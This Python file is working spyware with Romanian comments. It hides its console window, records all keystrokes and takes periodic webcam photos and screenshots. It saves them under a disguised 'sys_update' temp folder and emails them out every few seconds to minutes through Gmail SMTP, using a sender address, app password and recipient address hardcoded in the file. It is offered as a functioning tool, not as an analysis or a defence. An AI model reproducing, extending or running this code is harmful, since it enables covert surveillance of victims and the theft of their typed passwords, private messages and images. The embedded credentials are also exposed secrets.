import smtplib
import poplib
import email
import threading
import time
import pynput.keyboard
from pynput import keyboard
from PIL import ImageGrab
import cv2
import os
import sys
import ctypes
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import tempfile

# ====================== CONFIGURARE EMAIL ======================
EMAIL_CONFIG = {
    'smtp_server': 'smtp.gmail.com',
    'smtp_port': 587,
    'pop3_server': 'pop.gmail.com',
    'pop3_port': 995,
    'sender_email': 'romanbogdan475@gmail.com',
    'sender_password': 'cxzv ddop qosk hvdy',
    'recipient_email': 'timoteiroman19@gmail.com'
}

# Ascunde consola
if sys.platform == "win32":
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

class Agent:
    def __init__(self):
        self.keylogger_running = False
        self.camera_running = True
        self.screenshot_running = True
        self.buffer = ""
        
        self.base_folder = os.path.join(tempfile.gettempdir(), "sys_update")
        self.photo_folder = os.path.join(self.base_folder, "photos")
        self.screenshot_folder = os.path.join(self.base_folder, "screenshots")
        
        os.makedirs(self.photo_folder, exist_ok=True)
        os.makedirs(self.screenshot_folder, exist_ok=True)
        
        print("[+] Agent pornit - Trimitere individuală")

        # Pornim toate automat
        self.start_keylogger()
        self.start_keylog_sender()
        self.start_auto_camera()
        self.start_auto_screenshot()

    # ====================== TRIMITERE EMAIL ======================
    def send_email(self, subject, body, attachments=None):
        try:
            msg = MIMEMultipart()
            msg['From'] = EMAIL_CONFIG['sender_email']
            msg['To'] = EMAIL_CONFIG['recipient_email']
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))

            if attachments:
                for file_path in attachments:
                    if os.path.exists(file_path):
                        with open(file_path, 'rb') as f:
                            if file_path.lower().endswith(('.jpg', '.jpeg', '.png')):
                                img = MIMEImage(f.read(), name=os.path.basename(file_path))
                                msg.attach(img)

            with smtplib.SMTP(EMAIL_CONFIG['smtp_server'], EMAIL_CONFIG['smtp_port']) as server:
                server.starttls()
                server.login(EMAIL_CONFIG['sender_email'], EMAIL_CONFIG['sender_password'])
                server.send_message(msg)
            
            print(f"[+] Trimis: {subject}")
            return True
        except Exception as e:
            print(f"[-] Eroare email: {e}")
            return False

    # ====================== KEYLOGGER ======================
    def start_keylogger(self):
        if self.keylogger_running: return
        self.keylogger_running = True
        
        def on_press(key):
            try:
                char = key.char
            except AttributeError:
                if key == keyboard.Key.space:
                    char = " "
                elif key == keyboard.Key.enter:
                    char = "\n"
                elif key == keyboard.Key.backspace:
                    char = "[BACK]"
                else:
                    char = f"[{str(key).replace('Key.', '')}]"
            
            self.buffer += char
           

        self.key_listener = keyboard.Listener(on_press=on_press)
        self.key_listener.start()
        print("[+] Keylogger pornit")

    # ====================== TRIMITERE KEYLOGGER ======================
    def start_keylog_sender(self):
        def loop():
            while True:
                time.sleep(25)
                if self.buffer.strip():
                    self.send_email("KEYLOG", f"Keylogger Report:\n\n{self.buffer}")
                    print(f"[+] Keylogger trimis ({len(self.buffer)} caractere)")
                    self.buffer = ""
                else:
                    print("[DEBUG] Buffer gol")
        threading.Thread(target=loop, daemon=True).start()
        print("[+] Trimitere keylog pornită (25 secunde)")

    # ====================== CAMERA ======================
    def start_auto_camera(self):
        def loop():
            while self.camera_running:
                try:
                    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                    ret, frame = cap.read()
                    if ret:
                        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                        path = os.path.join(self.photo_folder, f"photo_{ts}.jpg")
                        cv2.imwrite(path, frame)
                        self.send_email("PHOTO", "Poză automată", [path])
                except:
                    pass
                finally:
                    if 'cap' in locals():
                        cap.release()
                time.sleep(60)
        threading.Thread(target=loop, daemon=True).start()
        print("[+] Auto Camera pornită (60 secunde)")

    # ====================== SCREENSHOT ======================
    def take_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = os.path.join(self.screenshot_folder, f"screenshot_{ts}.png")
            screenshot.save(path)
            self.send_email("SCREENSHOT", "Screenshot automată", [path])
        except Exception as e:
            print(f"[-] Eroare screenshot: {e}")

    def start_auto_screenshot(self):
        def loop():
            while self.screenshot_running:
                self.take_screenshot()
                time.sleep(90)
        threading.Thread(target=loop, daemon=True).start()
        print("[+] Auto Screenshot pornit (90 secunde)")

if __name__ == "__main__":
    agent = Agent()
    print("Agentul rulează ascuns. Keylogger, Poze și Screenshots se trimit individual.")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Agent oprit.")
        sys.exit(0)